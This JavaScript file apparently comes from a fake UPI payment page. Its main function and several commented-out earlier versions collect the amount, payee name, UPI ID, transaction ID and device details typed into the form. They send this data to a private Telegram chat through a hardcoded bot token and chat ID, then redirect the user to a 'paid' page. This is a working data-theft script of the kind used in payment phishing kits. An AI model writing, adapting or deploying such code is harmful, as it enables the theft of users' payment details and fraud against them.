// function savedata() {
//   let mainamount = document.getElementById('amountmain').value;
//   let paytomain = document.getElementById('payingtomain').value;
//   let upiid = document.getElementById('upimain').value;
//   let trnsid = document.getElementById('upitransactionmain').value;
//   if (mainamount == '' && paytomain == '' && upiid == '' && trnsid == '') {
//     console.log('nothing to show');
//   } else {
//     localStorage.setItem('mainamount', mainamount);
//     localStorage.setItem('paytomain', paytomain);
//     localStorage.setItem('upiid', upiid);
//     localStorage.setItem('trnsid', trnsid);
//   }
// }

//bot token
// var telegram_bot_id = '6707977493:AAHZeLLx1qC1_S6tecCociGhbPn3-vhmmdU';
//chat id
// var chat_id = 1212458291;
// var amount, bankingname, upiidsend, trnsidsend;
// amount = document.getElementById('amountmain').value;
// bankingname = document.getElementById('payingtomain').value;
// upiidsend = document.getElementById('upimain').value;
// trnsidsend = document.getElementById('upitransactionmain').value;
// message =
//   'Amount: ' +
//   amount +
//   '\nbankingname: ' +
//   bankingname +
//   '\nupiid: ' +
//   upiidsend +
//   '\ntrnsid: ' +
//   trnsidsend;

// var settings = {
//   async: true,
//   crossDomain: true,
//   url: 'https://api.telegram.org/bot' + telegram_bot_id + '/sendMessage',
//   method: 'POST',
//   headers: {
//     'Content-Type': 'application/json',
//     'cache-control': 'no-cache',
//   },
//   data: JSON.stringify({
//     chat_id: chat_id,
//     text: message,
//   }),
// };
// $.ajax(settings).done(function (response) {
//   console.log(response);
// });

// function topaidpage() {
//   window.location.assign('paid.html');
// }

// function doeverything() {
//   let mainamount = document.getElementById('amountmain').value;
//   let paytomain = document.getElementById('payingtomain').value;
//   let upiid = document.getElementById('upimain').value;
//   let trnsid = document.getElementById('upitransactionmain').value;
//   if (mainamount == '' && paytomain == '' && upiid == '' && trnsid == '') {
//     console.log('nothing to show');
//   } else {
//     localStorage.setItem('mainamount', mainamount);
//     localStorage.setItem('paytomain', paytomain);
//     localStorage.setItem('upiid', upiid);
//     localStorage.setItem('trnsid', trnsid);
//   }

//   window.location.assign('paid.html');

//   //bot token
//   var telegram_bot_id = '6707977493:AAHZeLLx1qC1_S6tecCociGhbPn3-vhmmdU';
//   //chat id
//   var chat_id = 1212458291;
//   var amount, bankingname, upiidsend, trnsidsend;
//   amount = document.getElementById('amountmain').value;
//   bankingname = document.getElementById('payingtomain').value;
//   upiidsend = document.getElementById('upimain').value;
//   trnsidsend = document.getElementById('upitransactionmain').value;
//   message =
//     'Amount: ' +
//     amount +
//     '\nbankingname: ' +
//     bankingname +
//     '\nupiid: ' +
//     upiidsend +
//     '\ntrnsid: ' +
//     trnsidsend;

//   var settings = {
//     async: true,
//     crossDomain: true,
//     url: 'https://api.telegram.org/bot' + telegram_bot_id + '/sendMessage',
//     method: 'POST',
//     headers: {
//       'Content-Type': 'application/json',
//       'cache-control': 'no-cache',
//     },
//     data: JSON.stringify({
//       chat_id: chat_id,
//       text: message,
//     }),
//   };
//   $.ajax(settings).done(function (response) {
//     console.log(response);
//   });
// }

function getDeviceType() {
  const ua = navigator.userAgent;
  if (/mobile/i.test(ua)) {
    return 'Mobile';
  } else if (/tablet/i.test(ua)) {
    return 'Tablet';
  } else {
    return 'Desktop';
  }
}

function getPlatform() {
  const ua = navigator.userAgent;
  console.log(ua);
  return ua;
}

function doeverything() {
  let mainamount = document.getElementById('amountmain').value;
  let paytomain = document.getElementById('payingtomain').value;
  let upiid = document.getElementById('upimain').value;
  let trnsid = document.getElementById('upitransactionmain').value;
  let device = getDeviceType();
  let platform = getPlatform();

  // Check if all fields are empty
  if (mainamount === '' && paytomain === '' && upiid === '' && trnsid === '') {
    console.log('nothing to show');
    return; // Exit the function if there's nothing to show
  }

  // Save data to localStorage
  localStorage.setItem('mainamount', mainamount);
  localStorage.setItem('paytomain', paytomain);
  localStorage.setItem('upiid', upiid);
  localStorage.setItem('trnsid', trnsid);

  // Construct the message to send to the Telegram bot
  let message = `Amount: ${mainamount}\nBanking Name: ${paytomain}\nUPI ID: ${upiid}\nTransaction ID: ${trnsid}\nDevice: ${device} \nOS: ${platform}`;

  // Bot token and chat ID
  const telegram_bot_id = '6707977493:AAHZeLLx1qC1_S6tecCociGhbPn3-vhmmdU';
  const chat_id = 1212458291;

  // Send the message to the Telegram bot
  let settings = {
    async: true,
    crossDomain: true,
    url: `https://api.telegram.org/bot${telegram_bot_id}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'cache-control': 'no-cache',
    },
    data: JSON.stringify({
      chat_id: chat_id,
      text: message,
    }),
  };

  $.ajax(settings)
    .done(function (response) {
      console.log(response);
      // Redirect to the paid page after sending the message
      window.location.assign('paid.html');
    })
    .fail(function (jqXHR, textStatus, errorThrown) {
      console.error('Error sending message:', textStatus, errorThrown);
    });
}
